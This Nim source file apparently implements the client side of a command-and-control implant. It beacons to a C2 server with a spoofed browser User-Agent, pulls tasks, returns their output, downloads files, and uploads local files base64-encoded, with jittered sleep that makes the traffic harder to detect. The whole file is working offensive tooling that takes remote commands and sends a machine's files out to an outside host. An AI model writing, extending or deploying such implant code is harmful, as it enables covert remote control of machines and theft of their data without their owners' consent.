import httpclient, json, strutils, times, os, base64, random
from net import Port

type
  Listener* = object
    id*: string
    listenerType*: string
    listenerHost*: string
    listenerIp*: string
    listenerPort*: string
    taskPath*: string
    userAgent*: string
    sleepTime*: int
    jitter*: int

proc newListener*(listenerType: string = "http",
                 host: string = "",
                 ip: string = "127.0.0.1",
                 port: string = "8080",
                 taskPath: string = "/api/tasks",
                 userAgent: string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"): Listener =
  result.id = getTime().toUnix().`$`
  result.listenerType = listenerType
  result.listenerHost = host
  result.listenerIp = ip
  result.listenerPort = port
  result.taskPath = taskPath
  result.userAgent = userAgent
  result.sleepTime = 5000  # 5 seconds default
  result.jitter = 20       # 20% jitter default

proc buildUrl*(li: Listener, endpoint: string = ""): string =
  result = li.listenerType & "://"
  if li.listenerHost != "":
    result = result & li.listenerHost
  else:
    result = result & li.listenerIp & ":" & li.listenerPort

  if endpoint != "":
    result = result & endpoint
  else:
    result = result & li.taskPath

proc sendBeacon*(li: Listener, data: JsonNode): JsonNode =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"User-Agent": li.userAgent, "Content-Type": "application/json"})

  try:
    let url = li.buildUrl()
    let response = client.request(url, httpMethod = HttpPost, body = $data)

    if response.status == "200 OK":
      result = parseJson(response.body)
    else:
      result = %*{"error": "Failed to communicate with C2 server", "status": response.status}

  except:
    result = %*{"error": "Connection failed", "message": getCurrentExceptionMsg()}

  finally:
    client.close()

proc getTasks*(li: Listener): JsonNode =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"User-Agent": li.userAgent})

  try:
    let url = li.buildUrl() & "?id=" & li.id
    let response = client.get(url)

    if response.status == "200 OK":
      if response.body != "":
        result = parseJson(response.body)
      else:
        result = %*{"tasks": []}
    else:
      result = %*{"error": "Failed to get tasks", "status": response.status}

  except:
    result = %*{"error": "Failed to get tasks", "message": getCurrentExceptionMsg()}

  finally:
    client.close()

proc sendTaskResult*(li: Listener, taskId: string, output: string, success: bool = true): bool =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"User-Agent": li.userAgent, "Content-Type": "application/json"})

  let data = %*{
    "task_id": taskId,
    "output": output,
    "success": success,
    "timestamp": getTime().toUnix()
  }

  try:
    let url = li.buildUrl("/api/results")
    let response = client.request(url, httpMethod = HttpPost, body = $data)
    result = response.status == "200 OK"

  except:
    result = false

  finally:
    client.close()

proc downloadFile*(li: Listener, fileId: string): string =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"User-Agent": li.userAgent})

  try:
    let url = li.buildUrl("/api/download/" & fileId & "?id=" & li.id)
    let response = client.get(url)

    if response.status == "200 OK":
      result = response.body
    else:
      result = ""

  except:
    result = ""

  finally:
    client.close()

proc uploadFile*(li: Listener, filePath: string): string =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"User-Agent": li.userAgent})

  try:
    if not fileExists(filePath):
      return "File not found: " & filePath

    let fileContent = readFile(filePath)
    let fileName = extractFilename(filePath)

    let data = %*{
      "filename": fileName,
      "content": base64.encode(fileContent),
      "agent_id": li.id
    }

    let url = li.buildUrl("/api/upload")
    let response = client.request(url, httpMethod = HttpPost, body = $data)

    if response.status == "200 OK":
      let responseJson = parseJson(response.body)
      result = responseJson{"file_id"}.getStr("unknown")
    else:
      result = "Upload failed: " & response.status

  except:
    result = "Upload error: " & getCurrentExceptionMsg()

  finally:
    client.close()

proc calculateSleep*(li: Listener): int =
  if li.jitter == 0:
    return li.sleepTime

  let jitterMs = (li.sleepTime * li.jitter) div 100
  let minSleep = li.sleepTime - jitterMs
  let maxSleep = li.sleepTime + jitterMs

  randomize()
  result = rand(minSleep..maxSleep)
